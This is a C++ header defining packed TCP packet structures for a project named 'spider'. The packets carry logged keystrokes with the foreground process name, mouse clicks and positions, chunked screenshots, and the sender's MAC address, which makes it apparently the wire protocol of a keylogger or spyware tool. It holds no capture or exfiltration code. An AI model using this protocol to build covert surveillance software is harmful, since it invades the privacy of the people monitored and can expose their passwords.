#pragma once

#include <cstdint>
#include <array>

#if defined __GNUC__ || defined __clang__
#define PACK_STRUCT(declaration) declaration __attribute__((__packed__))
#elif defined _MSC_VER
#define PACK_STRUCT(declaration)                                              \
  __pragma(pack(push, 1)) declaration __pragma(pack(pop))
#else
#pragma "Compiler not supported."
#endif

#if defined   __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wpacked"
#endif

namespace spider
{
  namespace network
  {
    namespace tcp
    {

      using PathArray = std::array<std::uint8_t, 64>;
      using MacAddrArray = std::array<std::uint8_t, 6>;

      // The different types of packets
      enum class PacketType : std::uint8_t
      {
	KeyboardEvent = 0,
	MouseButton,
	MousePosition,
	Screenshot,
	Infos
      };

      // The state of the pressed key / button
      enum class PacketEventState : std::uint8_t
      {
	Down = 0,
	Up
      };

      PACK_STRUCT(struct PacketHeader {
	std::uint64_t time;       // Timestamp
	PacketType    type;       // Packet type
	MacAddrArray  macAddress; // MAC address of the emitter
      });
      static_assert(sizeof(PacketHeader) ==
                        sizeof(std::uint64_t) + sizeof(std::uint8_t) +
                            sizeof(MacAddrArray),
                    "Invalid PacketHeader size");

      PACK_STRUCT(struct PacketEvent {
	std::uint32_t    key;   // The key / button that was pressed
	PacketEventState state; // The state of the pressed key / button
	std::uint8_t
	             repeat; // How many time was this key pressed during this event ?
	std::uint8_t shift; // is shift pressed ?
	PathArray
	    processName; // The foreground process at the moment of the event
      });
      static_assert(sizeof(PacketEvent) ==
                        sizeof(std::uint32_t) + sizeof(std::uint8_t) * 3 +
                            sizeof(std::uint8_t) * 64,
                    "Invalid PacketEvent size");

      PACK_STRUCT(struct PacketMov {
	std::uint32_t posX;        // Position X of the mouse
	std::uint32_t posY;        // Position Y of the mouse
	PathArray     processName; // Same as above
      });
      static_assert(sizeof(PacketMov) ==
                        sizeof(std::uint32_t) * 2 + sizeof(std::uint8_t) * 64,
                    "Invalid PacketMov size");

      PACK_STRUCT(struct PacketImgHeader {
	std::uint32_t totalSize; // Total size of the image
	std::uint32_t size;      // Size of this chunk of the image
	std::uint16_t id;        // Current part of the image chunk
      });
      static_assert(sizeof(PacketImgHeader) ==
                        sizeof(std::uint32_t) * 2 + sizeof(std::uint16_t),
                    "Invalid PacketImgHeader size");
    }
  }
}

#if defined   __clang__
#pragma clang diagnostic pop
#endif
